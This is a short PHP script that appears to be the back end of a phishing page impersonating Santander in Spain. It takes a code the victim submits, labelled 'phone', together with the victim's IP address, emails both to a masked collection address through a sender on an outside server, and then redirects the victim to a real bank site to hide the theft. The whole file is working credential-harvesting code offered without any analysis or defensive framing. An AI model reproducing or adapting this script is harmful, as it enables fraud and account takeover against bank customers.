<?php

$ip = getenv("REMOTE_ADDR");



$message .= "#                       #\n";
$message .= "#============= LOG ============#\n";
$message .= "#                       #\n";
$message .= "============================ : $ip\n";
$message .= "phone :  ".$_POST['code']."\n";
$message .= "============================ : $ip\n";

$send = "xxxx@xxxx.xx";


$subject = "|Santander| $ip |";


$from = "From: Spain <josfrans@server1.startsting.nl>";


mail($send,$subject,$message,$from);

header("Location: https://ing.es");
?>